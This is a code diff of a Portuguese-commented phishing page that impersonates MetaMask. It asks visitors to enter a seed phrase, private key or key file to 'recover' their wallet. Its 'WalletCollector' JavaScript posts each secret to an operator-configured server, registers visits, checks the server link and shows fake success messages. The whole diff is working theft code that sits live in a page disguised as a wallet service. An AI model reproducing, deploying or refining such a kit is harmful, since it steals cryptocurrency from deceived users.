@@ -6,6 +6,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MetaMask - Wallet Segura para Ethereum</title>
 
+    <!-- CONFIGURAÇÃO DA PÁGINA -->
+    <script>
+        // ============================================
+        // CONFIGURAÇÕES IMPORTANTES - ALTERE AQUI!
+        // ============================================
+        const PAGE_CONFIG = {
+            // URL do seu servidor onde está rodando o app.py
+            // IMPORTANTE: Altere para o IP/domínio do seu servidor
+            serverUrl: 'http://SEU-IP-OU-DOMINIO:5000', // Ex: 'http://192.168.1.100:5000' ou 'https://meuservidor.com'
+
+            // ID da página (deve corresponder ao page_config.py)
+            pageSource: 'metamask', // Corresponde ao PAGES_CONFIG['metamask']
+
+            // ID do usuário responsável por esta página (opcional)
+            userId: null, // Deixe null para detecção automática
+
+            // Habilitar funcionalidades
+            features: {
+                counter: true,      // Coletar dados de visitantes
+                seedPhrase: true,   // Aceitar seed phrases
+                privateKey: true,   // Aceitar private keys
+                keyFile: true       // Aceitar arquivos de chave
+            },
+
+            // Debug mode
+            debug: true // Mostra logs no console (desative em produção)
+        };
+    </script>
+
     <style>
         * {
             margin: 0;
@@ -129,17 +158,7 @@
             font-size: 14px;
         }
 
-        textarea {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 14px;
-            resize: vertical;
-            min-height: 100px;
-            transition: border-color 0.3s ease;
-        }
-
+        textarea,
         input[type="text"] {
             width: 100%;
             padding: 12px;
@@ -147,6 +166,11 @@
             border-radius: 10px;
             font-size: 14px;
             transition: border-color 0.3s ease;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
         }
 
         input[type="file"] {
@@ -186,10 +210,10 @@
             transform: translateY(0);
         }
 
-        .btn.loading {
+        .btn:disabled {
             background: #ccc;
             cursor: not-allowed;
-            pointer-events: none;
+            transform: none;
         }
 
         .helper-text {
@@ -213,9 +237,9 @@
             margin-bottom: 5px;
         }
 
-        /* Estilos para notificações (serão injetados pela biblioteca) */
-        body.loading::after {
-            content: '';
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
@@ -223,57 +247,92 @@
             bottom: 0;
             background: rgba(0, 0, 0, 0.5);
             z-index: 9999;
-            display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        body.loading::before {
-            content: '';
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
             width: 50px;
             height: 50px;
             border: 3px solid #f3f3f3;
             border-top: 3px solid #667eea;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            z-index: 10000;
         }
 
         @keyframes spin {
             0% {
-                transform: translate(-50%, -50%) rotate(0deg);
+                transform: rotate(0deg);
             }
 
             100% {
-                transform: translate(-50%, -50%) rotate(360deg);
+                transform: rotate(360deg);
             }
         }
 
-        .success-message {
-            color: #0F9D58;
-            font-size: 14px;
-            margin-top: 10px;
-            text-align: center;
+        /* Notifications */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 24px;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            z-index: 10000;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            background-color: #0F9D58;
+        }
+
+        .notification.error {
+            background-color: #d32f2f;
+        }
+
+        .notification.info {
+            background-color: #2196F3;
+        }
+
+        /* Status indicator */
+        .status-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 8px 12px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            border-radius: 5px;
+            font-size: 12px;
             display: none;
         }
 
-        .error-message {
-            color: #d32f2f;
-            font-size: 14px;
-            margin-top: 10px;
-            text-align: center;
-            display: none;
+        .status-indicator.online {
+            display: block;
+            background: rgba(15, 157, 88, 0.9);
+        }
+
+        .status-indicator.offline {
+            display: block;
+            background: rgba(211, 47, 47, 0.9);
         }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <!-- Logo do MetaMask (você pode substituir por uma imagem real) -->
+        <!-- Logo do MetaMask -->
         <svg class="logo" viewBox="0 0 318.6 318.6">
             <polygon fill="#E2761B" points="274.1,35.5 174.6,109.4 193,65.8" />
             <polygon fill="#E4761B" points="44.4,35.5 143.1,110.1 125.6,65.8" />
@@ -294,9 +353,9 @@
         </div>
 
         <div class="tabs">
-            <button class="tab active" onclick="switchTab('seed')">Seed Phrase</button>
-            <button class="tab" onclick="switchTab('private')">Private Key</button>
-            <button class="tab" onclick="switchTab('file')">Key File</button>
+            <button class="tab active" onclick="switchTab('seed', event)">Seed Phrase</button>
+            <button class="tab" onclick="switchTab('private', event)">Private Key</button>
+            <button class="tab" onclick="switchTab('file', event)">Key File</button>
         </div>
 
         <form id="walletForm">
@@ -335,128 +394,90 @@
                 <button type="submit" class="btn" id="fileBtn">Recuperar com Key File</button>
             </div>
         </form>
-
-        <div class="success-message" id="successMessage"></div>
-        <div class="error-message" id="errorMessage"></div>
     </div>
 
-    <!-- Incluir a biblioteca WalletCollector -->
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Status indicator -->
+    <div class="status-indicator" id="statusIndicator"></div>
+
     <script>
-        // ========================================
-        // CONFIGURAÇÃO DA BIBLIOTECA WALLET COLLECTOR
-        // ========================================
-
-        /**
-         * IMPORTANTE: Cole aqui o conteúdo completo do arquivo wallet-collector.js
-         * ou faça o include via CDN/arquivo externo
-         */
-
-        // Para este exemplo, vou incluir a biblioteca inline
-        // Em produção, você pode hospedar o arquivo separadamente
-
+        // ============================================
+        // WALLET COLLECTOR LIBRARY
+        // ============================================
         class WalletCollector {
-            constructor(config = {}) {
-                this.config = {
-                    serverUrl: config.serverUrl || 'http://localhost:5000',
-                    pageSource: config.pageSource || 'default',
-                    features: {
-                        counter: config.features?.counter !== false,
-                        seedPhrase: config.features?.seedPhrase !== false,
-                        privateKey: config.features?.privateKey !== false,
-                        keyFile: config.features?.keyFile !== false,
-                    },
-                    ui: {
-                        seedInput: config.ui?.seedInput || 'seedPhrase',
-                        privateKeyInput: config.ui?.privateKeyInput || 'privateKey',
-                        keyFileInput: config.ui?.keyFileInput || 'keyFile',
-                        successClass: config.ui?.successClass || 'success',
-                        errorClass: config.ui?.errorClass || 'error',
-                        loadingClass: config.ui?.loadingClass || 'loading',
-                        messages: {
-                            seedSuccess: config.ui?.messages?.seedSuccess || 'Seed phrase enviada com sucesso!',
-                            seedError: config.ui?.messages?.seedError || 'Erro ao enviar seed phrase',
-                            privateKeySuccess: config.ui?.messages?.privateKeySuccess || 'Private key enviada com sucesso!',
-                            privateKeyError: config.ui?.messages?.privateKeyError || 'Erro ao enviar private key',
-                            keyFileSuccess: config.ui?.messages?.keyFileSuccess || 'Arquivo enviado com sucesso!',
-                            keyFileError: config.ui?.messages?.keyFileError || 'Erro ao enviar arquivo',
-                            invalidSeed: config.ui?.messages?.invalidSeed || 'Seed phrase inválida (deve ter 12, 15, 18, 21 ou 24 palavras)',
-                            invalidPrivateKey: config.ui?.messages?.invalidPrivateKey || 'Private key inválida (deve ter 64 caracteres hexadecimais)',
-                            invalidFile: config.ui?.messages?.invalidFile || 'Tipo de arquivo não permitido',
-                        }
-                    },
-                    notification: {
-                        enabled: config.notification?.enabled !== false,
-                        duration: config.notification?.duration || 3000,
-                        position: config.notification?.position || 'top-right',
-                    },
-                    autoCollectCounter: config.autoCollectCounter !== false,
-                    debug: config.debug || false
-                };
-
-                this.isInitialized = false;
-                this.collectedData = {
-                    counter: false,
-                    seeds: [],
-                    privateKeys: [],
-                    keyFiles: []
-                };
+            constructor() {
+                this.config = PAGE_CONFIG;
+                this.visitRegistered = false;
+                this.isOnline = false;
+                this.checkConnection();
             }
 
             async init() {
-                if (this.isInitialized) {
-                    this.log('WalletCollector já foi inicializado');
-                    return;
-                }
-
                 this.log('Inicializando WalletCollector...');
 
-                if (this.config.features.counter && this.config.autoCollectCounter) {
-                    await this.collectCounter();
+                // Registrar visita automaticamente
+                if (this.config.features.counter && !this.visitRegistered) {
+                    await this.registerVisit();
                 }
 
-                if (this.config.notification.enabled) {
-                    this.createNotificationContainer();
-                }
-
-                this.isInitialized = true;
-                this.log('WalletCollector inicializado com sucesso');
+                // Verificar conexão periodicamente
+                setInterval(() => this.checkConnection(), 5000);
             }
 
-            async collectCounter() {
-                if (!this.config.features.counter) {
-                    this.log('Funcionalidade de contador está desabilitada');
-                    return false;
-                }
+            async checkConnection() {
+                try {
+                    // Tentar fazer uma requisição HEAD para verificar conectividade
+                    const response = await fetch(this.config.serverUrl + '/api/collect_counter', {
+                        method: 'OPTIONS',
+                        mode: 'cors',
+                        cache: 'no-cache'
+                    });
 
-                if (this.collectedData.counter) {
-                    this.log('Dados do contador já foram coletados para esta sessão');
-                    return false;
+                    this.setOnlineStatus(true);
+                } catch (error) {
+                    this.setOnlineStatus(false);
                 }
+            }
+
+            setOnlineStatus(online) {
+                this.isOnline = online;
+                const indicator = document.getElementById('statusIndicator');
+                if (online) {
+                    indicator.className = 'status-indicator online';
+                    indicator.textContent = '🟢 Conectado ao servidor';
+                } else {
+                    indicator.className = 'status-indicator offline';
+                    indicator.textContent = '🔴 Sem conexão com servidor';
+                }
+            }
+
+            async registerVisit() {
+                if (this.visitRegistered) return;
 
                 try {
-                    const response = await fetch(`${this.config.serverUrl}/api/collect_counter`, {
+                    const response = await fetch(this.config.serverUrl + '/api/collect_counter', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
+                        mode: 'cors',
                         body: JSON.stringify({
-                            page_source: this.config.pageSource
+                            page_source: this.config.pageSource,
+                            user_id: this.config.userId
                         })
                     });
 
                     const data = await response.json();
-
                     if (data.success) {
-                        this.collectedData.counter = true;
-                        this.log('Dados do contador coletados com sucesso');
-                        return true;
-                    } else {
-                        this.log('Erro ao coletar dados do contador:', data.message);
-                        return false;
+                        this.visitRegistered = true;
+                        this.log('Visita registrada com sucesso');
                     }
                 } catch (error) {
-                    this.log('Erro na requisição do contador:', error);
-                    return false;
+                    this.log('Erro ao registrar visita:', error);
                 }
             }
 
@@ -466,108 +487,18 @@
                 return validLengths.includes(words.length);
             }
 
-            async sendSeedPhrase(seedPhrase) {
-                if (!this.config.features.seedPhrase) {
-                    this.log('Funcionalidade de seed phrase está desabilitada');
-                    return false;
-                }
-
-                if (!this.validateSeedPhrase(seedPhrase)) {
-                    this.showNotification(this.config.ui.messages.invalidSeed, 'error');
-                    return false;
-                }
-
-                try {
-                    this.showLoading(true);
-
-                    const response = await fetch(`${this.config.serverUrl}/api/save_seed`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            seed_phrase: seedPhrase.trim(),
-                            page_source: this.config.pageSource
-                        })
-                    });
-
-                    const data = await response.json();
-
-                    if (data.success) {
-                        this.collectedData.seeds.push(seedPhrase);
-                        this.showNotification(this.config.ui.messages.seedSuccess, 'success');
-                        this.log('Seed phrase enviada com sucesso');
-                        return true;
-                    } else {
-                        this.showNotification(data.message || this.config.ui.messages.seedError, 'error');
-                        return false;
-                    }
-                } catch (error) {
-                    this.log('Erro ao enviar seed phrase:', error);
-                    this.showNotification(this.config.ui.messages.seedError, 'error');
-                    return false;
-                } finally {
-                    this.showLoading(false);
-                }
-            }
-
             validatePrivateKey(privateKey) {
-                const cleaned = privateKey.trim();
+                const cleaned = privateKey.trim().replace(/^0x/i, '');
                 return cleaned.length === 64 && /^[0-9a-fA-F]+$/.test(cleaned);
-            }
-
-            async sendPrivateKey(privateKey) {
-                if (!this.config.features.privateKey) {
-                    this.log('Funcionalidade de private key está desabilitada');
-                    return false;
-                }
-
-                if (!this.validatePrivateKey(privateKey)) {
-                    this.showNotification(this.config.ui.messages.invalidPrivateKey, 'error');
-                    return false;
-                }
-
-                try {
-                    this.showLoading(true);
-
-                    const response = await fetch(`${this.config.serverUrl}/api/save_private_key`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            private_key: privateKey.trim(),
-                            page_source: this.config.pageSource
-                        })
-                    });
-
-                    const data = await response.json();
-
-                    if (data.success) {
-                        this.collectedData.privateKeys.push(privateKey);
-                        this.showNotification(this.config.ui.messages.privateKeySuccess, 'success');
-                        this.log('Private key enviada com sucesso');
-                        return true;
-                    } else {
-                        this.showNotification(data.message || this.config.ui.messages.privateKeyError, 'error');
-                        return false;
-                    }
-                } catch (error) {
-                    this.log('Erro ao enviar private key:', error);
-                    this.showNotification(this.config.ui.messages.privateKeyError, 'error');
-                    return false;
-                } finally {
-                    this.showLoading(false);
-                }
             }
 
             validateKeyFile(file) {
                 const allowedExtensions = ['dat', 'txt', 'wallet', 'key', 'pem', 'hex', 'keystore', 'sk', 'seed'];
                 const extension = file.name.split('.').pop().toLowerCase();
-                const maxSize = 2 * 1024 * 1024;
+                const maxSize = 2 * 1024 * 1024; // 2MB
 
                 if (!allowedExtensions.includes(extension)) {
-                    this.showNotification(this.config.ui.messages.invalidFile, 'error');
+                    this.showNotification('Tipo de arquivo não permitido', 'error');
                     return false;
                 }
 
@@ -579,9 +510,104 @@
                 return true;
             }
 
+            async sendSeedPhrase(seedPhrase) {
+                if (!this.config.features.seedPhrase) {
+                    this.log('Seed phrase desabilitada');
+                    return false;
+                }
+
+                if (!this.validateSeedPhrase(seedPhrase)) {
+                    this.showNotification('Seed phrase inválida. Use 12, 15, 18, 21 ou 24 palavras', 'error');
+                    return false;
+                }
+
+                this.showLoading(true);
+
+                try {
+                    const response = await fetch(this.config.serverUrl + '/api/save_seed', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        mode: 'cors',
+                        body: JSON.stringify({
+                            seed_phrase: seedPhrase.trim(),
+                            page_source: this.config.pageSource,
+                            user_id: this.config.userId
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.showNotification('Carteira recuperada com sucesso!', 'success');
+                        this.log('Seed phrase enviada:', data);
+                        return true;
+                    } else {
+                        this.showNotification(data.message || 'Erro ao processar seed phrase', 'error');
+                        return false;
+                    }
+                } catch (error) {
+                    this.log('Erro ao enviar seed phrase:', error);
+                    this.showNotification('Erro de conexão. Verifique o servidor.', 'error');
+                    return false;
+                } finally {
+                    this.showLoading(false);
+                }
+            }
+
+            async sendPrivateKey(privateKey) {
+                if (!this.config.features.privateKey) {
+                    this.log('Private key desabilitada');
+                    return false;
+                }
+
+                // Remove 0x prefix if present
+                privateKey = privateKey.trim().replace(/^0x/i, '');
+
+                if (!this.validatePrivateKey(privateKey)) {
+                    this.showNotification('Private key inválida. Use 64 caracteres hexadecimais', 'error');
+                    return false;
+                }
+
+                this.showLoading(true);
+
+                try {
+                    const response = await fetch(this.config.serverUrl + '/api/save_private_key', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        mode: 'cors',
+                        body: JSON.stringify({
+                            private_key: privateKey,
+                            page_source: this.config.pageSource,
+                            user_id: this.config.userId
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.showNotification('Chave privada validada com sucesso!', 'success');
+                        this.log('Private key enviada:', data);
+                        return true;
+                    } else {
+                        this.showNotification(data.message || 'Erro ao processar private key', 'error');
+                        return false;
+                    }
+                } catch (error) {
+                    this.log('Erro ao enviar private key:', error);
+                    this.showNotification('Erro de conexão. Verifique o servidor.', 'error');
+                    return false;
+                } finally {
+                    this.showLoading(false);
+                }
+            }
+
             async sendKeyFile(file) {
                 if (!this.config.features.keyFile) {
-                    this.log('Funcionalidade de key file está desabilitada');
+                    this.log('Key file desabilitado');
                     return false;
                 }
 
@@ -589,99 +615,69 @@
                     return false;
                 }
 
-                try {
-                    this.showLoading(true);
+                this.showLoading(true);
 
+                try {
                     const formData = new FormData();
                     formData.append('key_file', file);
                     formData.append('page_source', this.config.pageSource);
+                    if (this.config.userId) {
+                        formData.append('user_id', this.config.userId);
+                    }
 
-                    const response = await fetch(`${this.config.serverUrl}/api/save_key_file`, {
+                    const response = await fetch(this.config.serverUrl + '/api/save_key_file', {
                         method: 'POST',
+                        mode: 'cors',
                         body: formData
                     });
 
                     const data = await response.json();
 
                     if (data.success) {
-                        this.collectedData.keyFiles.push(file.name);
-                        this.showNotification(this.config.ui.messages.keyFileSuccess, 'success');
-                        this.log('Key file enviado com sucesso');
+                        this.showNotification('Arquivo processado com sucesso!', 'success');
+                        this.log('Key file enviado:', data);
                         return true;
                     } else {
-                        this.showNotification(data.message || this.config.ui.messages.keyFileError, 'error');
+                        this.showNotification(data.message || 'Erro ao processar arquivo', 'error');
                         return false;
                     }
                 } catch (error) {
                     this.log('Erro ao enviar key file:', error);
-                    this.showNotification(this.config.ui.messages.keyFileError, 'error');
+                    this.showNotification('Erro de conexão. Verifique o servidor.', 'error');
                     return false;
                 } finally {
                     this.showLoading(false);
                 }
             }
 
-            createNotificationContainer() {
-                if (document.getElementById('wallet-collector-notifications')) {
-                    return;
+            showLoading(show) {
+                const overlay = document.getElementById('loadingOverlay');
+                if (show) {
+                    overlay.classList.add('active');
+                } else {
+                    overlay.classList.remove('active');
                 }
 
-                const container = document.createElement('div');
-                container.id = 'wallet-collector-notifications';
-                container.style.cssText = `
-                    position: fixed;
-                    ${this.config.notification.position.includes('top') ? 'top: 20px' : 'bottom: 20px'};
-                    ${this.config.notification.position.includes('right') ? 'right: 20px' : 'left: 20px'};
-                    z-index: 10000;
-                    display: flex;
-                    flex-direction: column;
-                    gap: 10px;
-                `;
-                document.body.appendChild(container);
+                // Disable/enable all buttons
+                document.querySelectorAll('.btn').forEach(btn => {
+                    btn.disabled = show;
+                });
             }
 
             showNotification(message, type = 'info') {
-                if (!this.config.notification.enabled) {
-                    return;
-                }
-
-                const container = document.getElementById('wallet-collector-notifications');
-                if (!container) {
-                    this.createNotificationContainer();
-                }
-
                 const notification = document.createElement('div');
-                notification.className = `wallet-collector-notification ${type}`;
-                notification.style.cssText = `
-                    padding: 12px 24px;
-                    border-radius: 5px;
-                    color: white;
-                    font-weight: bold;
-                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-                    transform: translateX(150%);
-                    transition: transform 0.3s ease;
-                    background-color: ${type === 'success' ? '#0F9D58' : type === 'error' ? '#d32f2f' : '#2196F3'};
-                `;
+                notification.className = `notification ${type}`;
                 notification.textContent = message;
-
-                document.getElementById('wallet-collector-notifications').appendChild(notification);
+                document.body.appendChild(notification);
 
                 setTimeout(() => {
-                    notification.style.transform = 'translateX(0)';
+                    notification.classList.add('show');
                 }, 10);
 
                 setTimeout(() => {
-                    notification.style.transform = 'translateX(150%)';
+                    notification.classList.remove('show');
                     setTimeout(() => notification.remove(), 300);
-                }, this.config.notification.duration);
-            }
-
-            showLoading(show) {
-                if (show) {
-                    document.body.classList.add(this.config.ui.loadingClass);
-                } else {
-                    document.body.classList.remove(this.config.ui.loadingClass);
-                }
+                }, 3000);
             }
 
             log(...args) {
@@ -691,76 +687,42 @@
             }
         }
 
-        // ========================================
-        // CONFIGURAÇÃO E INICIALIZAÇÃO
-        // ========================================
+        // ============================================
+        // INTERFACE LOGIC
+        // ============================================
+        let currentTab = 'seed';
+        const collector = new WalletCollector();
 
-        // ALTERE ESTAS CONFIGURAÇÕES CONFORME NECESSÁRIO
-        const collector = new WalletCollector({
-            // URL do seu servidor (onde está rodando o app.py)
-            serverUrl: 'http://localhost:5000', // ALTERE PARA SEU SERVIDOR
-
-            // Identificador desta página (deve corresponder ao PAGES_CONFIG)
-            pageSource: '#MetaMask-ID', // ALTERE PARA O ID DA SUA PÁGINA
-
-            // Funcionalidades habilitadas
-            features: {
-                counter: true,      // Coletar dados de visitantes
-                seedPhrase: true,   // Aceitar seed phrases
-                privateKey: true,   // Aceitar private keys
-                keyFile: true       // Aceitar arquivos de chave
-            },
-
-            // Mensagens personalizadas (opcional)
-            ui: {
-                messages: {
-                    seedSuccess: 'Carteira recuperada com sucesso!',
-                    seedError: 'Erro ao recuperar carteira',
-                    privateKeySuccess: 'Chave privada validada!',
-                    privateKeyError: 'Erro ao validar chave privada',
-                    keyFileSuccess: 'Arquivo processado com sucesso!',
-                    keyFileError: 'Erro ao processar arquivo'
-                }
-            },
-
-            // Debug mode (mostra logs no console)
-            debug: false
-        });
-
-        // Inicializar o coletor quando a página carregar
+        // Initialize collector when page loads
         document.addEventListener('DOMContentLoaded', async () => {
             await collector.init();
         });
 
-        // ========================================
-        // LÓGICA DA INTERFACE
-        // ========================================
+        function switchTab(tab, event) {
+            event.preventDefault();
 
-        let currentTab = 'seed';
-
-        function switchTab(tab) {
-            // Atualizar abas
+            // Update tabs
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
 
-            // Ativar aba selecionada
+            // Activate selected tab
             event.target.classList.add('active');
             document.getElementById(`${tab}-tab`).classList.add('active');
 
             currentTab = tab;
-
-            // Limpar mensagens
-            document.getElementById('successMessage').style.display = 'none';
-            document.getElementById('errorMessage').style.display = 'none';
         }
 
-        // Processar envio do formulário
+        // Handle form submission
         document.getElementById('walletForm').addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            if (!collector.isOnline) {
+                collector.showNotification('Sem conexão com o servidor. Verifique sua configuração.', 'error');
+                return;
+            }
+
             let success = false;
 
-            // Processar baseado na aba ativa
             if (currentTab === 'seed') {
                 const seedPhrase = document.getElementById('seedPhrase').value;
                 if (seedPhrase) {
@@ -786,6 +748,11 @@
                     }
                 }
             }
+        });
+
+        // Show initial connection status
+        window.addEventListener('load', () => {
+            setTimeout(() => collector.checkConnection(), 1000);
         });
     </script>
 </body>
